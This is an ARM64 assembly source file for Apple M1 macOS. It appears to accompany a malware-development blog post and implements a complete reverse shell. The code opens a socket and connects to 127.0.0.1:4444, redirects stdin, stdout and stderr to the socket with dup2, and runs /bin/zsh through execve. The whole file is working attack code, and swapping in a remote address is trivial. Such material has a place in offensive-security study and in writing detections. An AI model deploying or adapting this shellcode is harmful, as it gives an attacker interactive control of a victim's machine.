; hack.s
; apple M1 ARM reverse shell
; author: cocomelonc
; https://cocomelonc.github.io/macos/2025/10/15/malware-mac-12.html

.text
.global _start
.align 2
.section  __TEXT,__text
  ; sockaddr_in for 127.0.0.1:4444
  ; memory layout (little-endian):
  ; sin_len (1), sin_family (1), sin_port (2 BE), sin_addr (4), sin_zero[8]
  .data
sockaddr_in:
  .byte 16, 2, 0x11, 0x5c, 127, 0, 0, 1, 0,0,0,0, 0,0,0,0
  .text

_start:
  ; create socket: socket(AF_INET, SOCK_STREAM, 0)
  mov     x0, #2
  mov     x1, #1
  mov     x2, xzr
  mov     x16, #97
  svc     #0xffff
  ; check result in x0 (>=0)
  cmp     x0, #0
  blt     _exit_fail

  ; save socket fd
  mov     x19, x0

  ; prepare pointer to sockaddr_in (use adrp/add)
  adrp    x1, sockaddr_in@PAGE
  add     x1, x1, sockaddr_in@PAGEOFF
  mov     x2, #16        ; address length

  ; connect(sockfd, addr, addrlen)
  mov     x0, x19
  mov     x16, #98       ; bsd syscall: connect (98)
  svc     #0xffff
  cmp     x0, #0
  blt     _exit_fail

  ; redirect stderr/stdout/stdin -> socket using dup2
  ; dup2(sock, 2)
  mov     x0, x19
  mov     x1, #2
  mov     x16, #90
  svc     #0xffff

  ; dup2(sock, 1)
  mov     x0, x19
  mov     x1, #1
  ; x16 already 90, but set again for clarity
  mov     x16, #90
  svc     #0xffff

  ; dup2(sock, 0)
  mov     x0, x19
  mov     x1, #0
  mov     x16, #90
  svc     #0xffff

  ; execve("/bin/zsh", ["/bin/zsh", NULL], NULL)
  ; push path
  mov     x3, #0x622f             ; "/b"
  movk    x3, #0x6e69, lsl#16     ; "in"
  movk    x3, #0x7a2f, lsl#32     ; "/z"
  movk    x3, #0x6873, lsl#48     ; "sh"
  stp     x3, xzr, [sp, #-16]!    ; "/bin/zsh\0"

  ; argv = { path, NULL }
  add     x0, sp, xzr             ; x0 = pointer to path
  stp     x0, xzr, [sp, #-16]!    ; push argv array
  add     x1, sp, xzr             ; x1 = argv
  mov     x2, xzr                 ; envp = NULL

  mov     x16, #59                ; execve (bsd syscall 59)
  svc     #0xffff

  ;if execve returns -> exit
_exit_fail:
  mov     x0, #1
  mov     x16, #1    ; exit syscall wrapper via libc _exit may differ
                     ; we call _exit via symbol below
                     ; call libc _exit to be safe
  bl      _exit
